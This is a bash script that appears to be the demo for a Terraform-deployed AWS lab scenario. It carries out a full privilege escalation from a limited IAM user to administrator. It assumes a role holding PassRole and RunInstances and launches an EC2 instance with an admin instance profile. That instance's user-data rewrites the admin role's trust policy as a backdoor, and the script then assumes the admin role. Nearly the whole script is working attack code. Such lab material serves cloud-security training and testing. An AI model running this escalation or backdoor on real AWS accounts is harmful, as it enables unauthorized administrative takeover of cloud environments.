#!/bin/bash

# Demo script for iam:PassRole + ec2:RunInstances privilege escalation
# This script demonstrates how a role with PassRole and RunInstances can escalate to admin

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
STARTING_USER="pl-prod-one-hop-prec-starting-user"
PRIVESC_ROLE="pl-prod-one-hop-prec-role"
ADMIN_ROLE="pl-prod-one-hop-prec-admin-role"
INSTANCE_PROFILE="pl-prod-one-hop-prec-instance-profile"
DEMO_INSTANCE_TAG="pl-prec-demo-instance"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + EC2 RunInstances Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_iam_passrole_ec2_runinstances.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Assume the privilege escalation role
echo -e "${YELLOW}Step 4: Assuming role $PRIVESC_ROLE${NC}"
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${PRIVESC_ROLE}"
echo "Role ARN: $ROLE_ARN"

CREDENTIALS=$(aws sts assume-role \
    --role-arn $ROLE_ARN \
    --role-session-name demo-attack-session \
    --query 'Credentials' \
    --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
# Keep region consistent
export AWS_REGION=$AWS_REGION

# Verify we're now the role
ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $ROLE_IDENTITY"
echo -e "${GREEN}✓ Successfully assumed role${NC}\n"

# Step 5: Check current permissions (should be limited)
echo -e "${YELLOW}Step 5: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 6: Prepare user-data script to backdoor admin role
echo -e "${YELLOW}Step 6: Preparing EC2 user-data script to backdoor admin role${NC}"
echo "This script will modify the admin role's trust policy to allow our starting user to assume it"

# Create user-data script
USER_DATA=$(cat <<EOF
#!/bin/bash
exec > >(tee /var/log/user-data.log|logger -t user-data -s 2>/dev/console) 2>&1
echo "Starting privilege escalation script..."

STARTING_USER_ARN="arn:aws:iam::${ACCOUNT_ID}:user/${STARTING_USER}"
ADMIN_ROLE_NAME="${ADMIN_ROLE}"

# Wait for IAM role to be available
sleep 10

# Get current trust policy
aws iam get-role --role-name \$ADMIN_ROLE_NAME --query 'Role.AssumeRolePolicyDocument' --output json > /tmp/policy.json

# Add starting user to trust policy
jq --arg arn "\$STARTING_USER_ARN" '.Statement += [{"Effect": "Allow", "Principal": {"AWS": \$arn}, "Action": "sts:AssumeRole"}]' /tmp/policy.json > /tmp/new-policy.json

# Update trust policy
aws iam update-assume-role-policy --role-name \$ADMIN_ROLE_NAME --policy-document file:///tmp/new-policy.json

echo "Trust policy updated successfully"
EOF
)

# Base64 encode user-data for safe passing
USER_DATA_B64=$(echo "$USER_DATA" | base64)

echo -e "${GREEN}✓ User-data script prepared${NC}\n"

# Step 7: Get AMI ID for EC2 instance
echo -e "${YELLOW}Step 7: Finding Amazon Linux 2023 AMI${NC}"
AMI_ID=$(aws ec2 describe-images \
    --region $AWS_REGION \
    --owners amazon \
    --filters "Name=name,Values=al2023-ami-2023.*-x86_64" "Name=state,Values=available" \
    --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' \
    --output text)

if [ -z "$AMI_ID" ] || [ "$AMI_ID" = "None" ]; then
    echo -e "${YELLOW}Could not find Amazon Linux 2023 AMI, trying Amazon Linux 2...${NC}"
    AMI_ID=$(aws ec2 describe-images \
        --region $AWS_REGION \
        --owners amazon \
        --filters "Name=name,Values=amzn2-ami-hvm-*-x86_64-gp2" "Name=state,Values=available" \
        --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' \
        --output text)
fi

if [ -z "$AMI_ID" ] || [ "$AMI_ID" = "None" ]; then
    echo -e "${RED}Error: Could not find suitable AMI${NC}"
    exit 1
fi

echo "Using AMI: $AMI_ID"
echo -e "${GREEN}✓ Found AMI${NC}\n"

# Step 8: Launch EC2 instance with admin role
echo -e "${YELLOW}Step 8: Launching EC2 instance with admin instance profile${NC}"
echo "This is the privilege escalation vector - passing the admin role to EC2..."
echo "Instance profile: $INSTANCE_PROFILE"

# Get default VPC and subnet
DEFAULT_VPC=$(aws ec2 --region $AWS_REGION describe-vpcs --filters "Name=is-default,Values=true" --query 'Vpcs[0].VpcId' --output text)

if [ "$DEFAULT_VPC" = "None" ] || [ -z "$DEFAULT_VPC" ]; then
    echo -e "${RED}Error: No default VPC found. This demo requires a default VPC.${NC}"
    echo "Please create a default VPC or modify the script to use a specific VPC."
    exit 1
fi

DEFAULT_SUBNET=$(aws --region $AWS_REGION ec2 describe-subnets --filters "Name=vpc-id,Values=$DEFAULT_VPC" --query 'Subnets[0].SubnetId' --output text)

echo "Using VPC: $DEFAULT_VPC"
echo "Using Subnet: $DEFAULT_SUBNET"
echo "Using Region: $AWS_REGION"

# Launch instance
INSTANCE_ID=$(aws ec2 run-instances \
    --region $AWS_REGION \
    --image-id $AMI_ID \
    --instance-type t3.micro \
    --iam-instance-profile Name=$INSTANCE_PROFILE \
    --user-data "$USER_DATA" \
    --subnet-id $DEFAULT_SUBNET \
    --tag-specifications "ResourceType=instance,Tags=[{Key=Name,Value=$DEMO_INSTANCE_TAG},{Key=Environment,Value=demo}]" \
    --query 'Instances[0].InstanceId' \
    --output text)

if [ -z "$INSTANCE_ID" ]; then
    echo -e "${RED}Error: Failed to launch EC2 instance${NC}"
    exit 1
fi

echo "Instance ID: $INSTANCE_ID"
echo -e "${GREEN}✓ EC2 instance launched successfully${NC}\n"

# Step 9: Wait for backdoor to complete
echo -e "${YELLOW}Step 9: Waiting for user-data script to backdoor admin role${NC}"
echo "This may take 2-3 minutes while the instance starts and executes the script..."
echo ""

MAX_WAIT=300  # 5 minutes
WAIT_TIME=0
BACKDOOR_COMPLETE=false

while [ $WAIT_TIME -lt $MAX_WAIT ]; do
    # Check if starting user is in the trust policy
    TRUST_POLICY=$(aws iam get-role --role-name $ADMIN_ROLE --query 'Role.AssumeRolePolicyDocument' --output json 2>/dev/null || echo "")

    if echo "$TRUST_POLICY" | grep -q "$STARTING_USER"; then
        echo -e "${GREEN}✓ Backdoor complete! Starting user added to admin role trust policy${NC}\n"
        BACKDOOR_COMPLETE=true
        break
    fi

    echo -n "."
    sleep 10
    WAIT_TIME=$((WAIT_TIME + 10))
done

echo ""

if [ "$BACKDOOR_COMPLETE" = false ]; then
    echo -e "${RED}Error: Backdoor did not complete within timeout${NC}"
    echo "Instance ID: $INSTANCE_ID"
    echo "You may need to check the instance logs or increase the timeout"
    exit 1
fi

# Step 10: Switch back to starting user credentials
echo -e "${YELLOW}Step 10: Switching back to starting user credentials${NC}"
unset AWS_SESSION_TOKEN
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
# Keep region consistent
export AWS_REGION=$AWS_REGION

USER_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $USER_IDENTITY"
echo -e "${GREEN}✓ Switched to starting user${NC}\n"

# Step 11: Assume the backdoored admin role
echo -e "${YELLOW}Step 11: Assuming the backdoored admin role${NC}"
ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${ADMIN_ROLE}"
echo "Admin Role ARN: $ADMIN_ROLE_ARN"

ADMIN_CREDENTIALS=$(aws sts assume-role \
    --role-arn $ADMIN_ROLE_ARN \
    --role-session-name admin-session \
    --query 'Credentials' \
    --output json)

export AWS_ACCESS_KEY_ID=$(echo $ADMIN_CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $ADMIN_CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $ADMIN_CREDENTIALS | jq -r '.SessionToken')
# Keep region consistent
export AWS_REGION=$AWS_REGION

ADMIN_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "New identity: $ADMIN_IDENTITY"
echo -e "${GREEN}✓ Successfully assumed admin role!${NC}\n"

# Step 12: Verify admin access
echo -e "${YELLOW}Step 12: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."

if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# Summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (limited permissions)"
echo "2. Assumed role: $PRIVESC_ROLE (with iam:PassRole + ec2:RunInstances)"
echo "3. Launched EC2 instance with admin instance profile"
echo "4. EC2 instance modified admin role trust policy via user-data"
echo "5. Assumed admin role: $ADMIN_ROLE"
echo "6. Achieved: Administrator Access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (AssumeRole) → $PRIVESC_ROLE"
echo -e "  → (PassRole + RunInstances) → EC2 with $ADMIN_ROLE"
echo -e "  → (Backdoor Trust Policy) → Assume $ADMIN_ROLE → Admin"

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- EC2 Instance: $INSTANCE_ID"
echo "- Modified trust policy on: $ADMIN_ROLE"

echo -e "\n${RED}⚠ Warning: The admin role's trust policy has been modified${NC}"
echo -e "${RED}⚠ The EC2 instance is still running and incurring charges${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""
